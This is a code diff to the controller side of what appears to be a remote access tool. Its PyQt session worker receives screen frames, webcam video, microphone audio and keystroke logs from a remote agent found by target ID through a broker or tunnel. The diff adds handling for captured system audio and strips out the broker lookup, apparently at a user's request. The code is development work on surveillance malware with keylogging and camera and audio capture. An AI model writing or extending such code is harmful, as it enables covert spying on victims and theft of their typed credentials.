@@ -22,6 +22,7 @@ class AsyncSessionWorker(QObject):
     frame_received = pyqtSignal(bytes)
     cam_received = pyqtSignal(bytes)
     audio_received = pyqtSignal(bytes)
+    sys_audio_received = pyqtSignal(bytes)
     log_received = pyqtSignal(str)
     connection_lost = pyqtSignal()
     connection_progress = pyqtSignal(int, str)  # step (0-3), hint message
@@ -125,45 +126,10 @@ class AsyncSessionWorker(QObject):
                 with self._lock:
                     self.ws = ws
                 
-                # If Target ID is present, we are using Broker or P2P Relay
-                # Skip Broker Lookup if connecting directly via localhost or Cloudflare Tunnel
-                # Use parsed hostname for accuracy
-                try:
-                    if 'parsed' not in locals(): parsed = urlparse(self.target_url)
-                    hostname = parsed.hostname or ""
-                    is_direct = (hostname in ("localhost", "127.0.0.1", "::1") or 
-                                 hostname.endswith("trycloudflare.com"))
-                except:
-                    is_direct = False
-
-                if self.target_id and is_direct:
-                    # Warn: target_id provided but using direct connection
-                    print(f"[!] Warning: target_id '{self.target_id}' will be ignored in direct mode.")
-                    self.connection_progress.emit(1, "Direct mode: target_id ignored...")
-                
-                if self.target_id and not is_direct:
-                    # Step 1: Looking up target via Broker
-                    self.connection_progress.emit(1, f"Searching for {self.target_id}...")
-                    print(f"[*] Looking up {self.target_id}...")
-                    await send_msg(ws, bytes([protocol.OP_LOOKUP]) + self.target_id.encode())
-                    
-                    # Step 2: Waiting for handshake from Broker
-                    self.connection_progress.emit(2, "Waiting for agent response...")
-                    resp = await recv_msg(ws)
-                    if not resp:
-                        self.connection_lost.emit()
-                        return
-                    
-                    if resp[0] == protocol.OP_BRIDGE_OK:
-                        # Broker bridge established
-                        pass
-                    elif resp[0] == protocol.OP_ERROR:
-                        print("[-] Broker Error")
-                        self.connection_lost.emit()
-                        return
-                else:
-                    # Direct Connection (Cloudflare or Local)
-                    self.connection_progress.emit(1, "Direct Handshake...")
+                # Direct Connection (Cloudflare or Local)
+                # We removed Broker Lookup logic as per user request.
+                # Always assume Direct Mode.
+                self.connection_progress.emit(1, "Direct Handshake...")
                     
                 # Step 3: Application Level Handshake
                 self.connection_progress.emit(3, "Handshaking...")
@@ -267,6 +233,8 @@ class AsyncSessionWorker(QObject):
                 self.cam_received.emit(payload)
             elif opcode == protocol.OP_AUDIO_CHUNK:
                 self.audio_received.emit(payload)
+            elif opcode == protocol.OP_SYS_AUDIO_CHUNK:
+                self.sys_audio_received.emit(payload)
             elif opcode == protocol.OP_KEY_LOG:
                 try:
                     self.log_received.emit(payload.decode('utf-8'))
